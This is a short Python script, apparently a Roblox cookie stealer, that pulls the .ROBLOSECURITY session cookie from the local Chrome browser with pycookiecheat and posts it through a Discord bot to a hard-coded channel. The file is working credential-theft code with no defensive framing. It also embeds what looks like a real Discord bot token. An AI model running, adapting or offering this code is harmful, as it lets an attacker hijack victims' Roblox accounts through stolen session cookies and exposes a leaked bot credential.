import discord
from pycookiecheat import chrome_cookies

# Replace with your Discord bot token and channel ID
DISCORD_BOT_TOKEN = 'MTI0NDMxMTkwNzg2Mzc2MDkwNw.GVo-pP.ysX1pBHC1jxTiKIkFtLc6OQ2KZJ3gYXhrmjf3Q'
CHANNEL_ID = 1244712427111714947  # Replace with your channel ID

def get_roblox_security_cookie():
    # URL for which to retrieve cookies
    url = 'https://roblox.com'

    # Load Chrome cookies for the given URL
    cookies = chrome_cookies(url)

    # Get the .ROBLOSECURITY cookie value
    roblo_security_value = cookies.get('.ROBLOSECURITY', None)

    return roblo_security_value

roblo_security_value = get_roblox_security_cookie()

if roblo_security_value:
    message = f'.ROBLOSECURITY cookie value: {roblo_security_value}'
else:
    message = 'No .ROBLOSECURITY cookie found for roblox.com'

# Discord client setup
intents = discord.Intents.default()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    channel = client.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(message)
    await client.close()

# Run the Discord bot
client.run(DISCORD_BOT_TOKEN)
